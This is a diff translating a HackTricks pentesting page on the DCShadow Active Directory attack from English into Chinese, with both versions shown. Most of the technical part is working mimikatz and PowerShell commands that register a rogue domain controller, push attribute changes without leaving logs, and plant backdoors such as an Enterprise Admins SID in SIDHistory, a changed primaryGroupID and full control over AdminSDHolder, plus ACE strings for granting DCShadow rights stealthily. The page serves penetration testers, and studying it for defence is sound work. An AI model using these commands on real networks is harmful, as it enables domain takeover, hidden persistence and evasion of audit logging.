@@ -1,77 +1,69 @@
-
-
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
 
 
 # DCShadow
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.
+它在AD中注册一个**新的域控制器**，并使用它来在指定的对象上**推送属性**（SIDHistory，SPNs...），而不会留下任何关于**修改**的**日志**。您需要DA权限并位于**根域**内。\
+请注意，如果使用错误的数据，将会出现相当丑陋的日志。
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
+要执行此攻击，您需要2个mimikatz实例。其中一个将使用SYSTEM权限启动RPC服务器（您必须在此处指示要执行的更改），另一个实例将用于推送值：
 
-{% code title="mimikatz1 (RPC servers)" %}
+{% code title="mimikatz1（RPC服务器）" %}
 ```bash
 !+
 !processtoken
 lsadump::dcshadow /object:username /attribute:Description /value="My new description"
 ```
-{% endcode %}
-
-{% code title="mimikatz2 (push) - Needs DA or similar" %}
+{% code title="mimikatz2（推送）- 需要DA或类似权限" %}
 ```bash
 lsadump::dcshadow /push
 ```
 {% endcode %}
 
-Notice that **`elevate::token`** won't work in mimikatz1 session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+请注意，**`elevate::token`** 在 mimikatz1 会话中不起作用，因为它提升了线程的权限，但我们需要提升**进程的权限**。\
+您还可以选择并使用 "LDAP" 对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-You can push the changes from a DA or from a user with this minimal permissions:
+您可以从具有以下最低权限的 DA 或用户推送更改：
 
-* In the **domain object**:
-  * _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  * _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  * _DS-Replication-Synchronize_ (Replication Synchornization)
-* The **Sites object** (and its children) in the **Configuration container**:
-  * _CreateChild and DeleteChild_
-* The object of the **computer which is registered as a DC**:
-  * _WriteProperty_ (Not Write)
-* The **target object**:
-  * _WriteProperty_ (Not Write)
+* 在**域对象**中：
+* _DS-Install-Replica_（在域中添加/删除副本）
+* _DS-Replication-Manage-Topology_（管理复制拓扑）
+* _DS-Replication-Synchronize_（复制同步）
+* **配置容器**中的**站点对象**（及其子对象）：
+* _CreateChild 和 DeleteChild_
+* **注册为 DC 的计算机对象**：
+* _WriteProperty_（不是 Write）
+* **目标对象**：
+* _WriteProperty_（不是 Write）
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
+您可以使用[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)将这些权限授予非特权用户（请注意，这将留下一些日志）。这比拥有 DA 权限要严格得多。\
+例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着当用户名为 _**student1**_ 的用户在机器 _**mcorp-student1**_ 上登录时，对象 _**root1user**_ 具有 DCShadow 权限。
 
-## Using DCShadow to create backdoors
+## 使用 DCShadow 创建后门
 
-{% code title="Set Enterprise Admins in SIDHistory to a user" %}
+{% code title="将 SIDHistory 设置为用户的企业管理员" %}
 ```bash
-lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
+lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
 ```
-{% endcode %}
-
-{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
+{% code title="更改PrimaryGroupID（将用户设置为域管理员的成员）" %}
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
-{% endcode %}
-
-{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}
+{% code title="修改 AdminSDHolder 的 ntSecurityDescriptor（给用户完全控制权限）" %}
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
@@ -80,41 +72,37 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attr
 ```
 {% endcode %}
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+## Shadowception - 使用DCShadow授予DCShadow权限（无修改权限日志）
 
-We need to append following ACEs with our user's SID at the end:
+我们需要在以下ACE后面添加我们用户的SID：
 
-* On the domain object:
-  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
-  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-* On the attacker computer object: `(A;;WP;;;UserSID)`
-* On the target user object: `(A;;WP;;;UserSID)`
-* On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+* 在域对象上：
+* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
+* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
+* 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
+* 在目标用户对象上：`(A;;WP;;;UserSID)`
+* 在配置容器中的Sites对象上：`(A;CI;CCDC;;;UserSID)`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
+要获取对象的当前ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`
 
-Notice that in this case you need to make **several changes,** not just one. So, in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way, you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.
+请注意，在这种情况下，您需要进行**多个更改**，而不仅仅是一个。因此，在**mimikatz1会话**（RPC服务器）中，使用参数**`/stack`和每个更改**一起使用。这样，您只需要**`/push`**一次即可执行所有堆积的更改。
 
-
-
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
+[**有关ired.team中DCShadow的更多信息。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
-
-
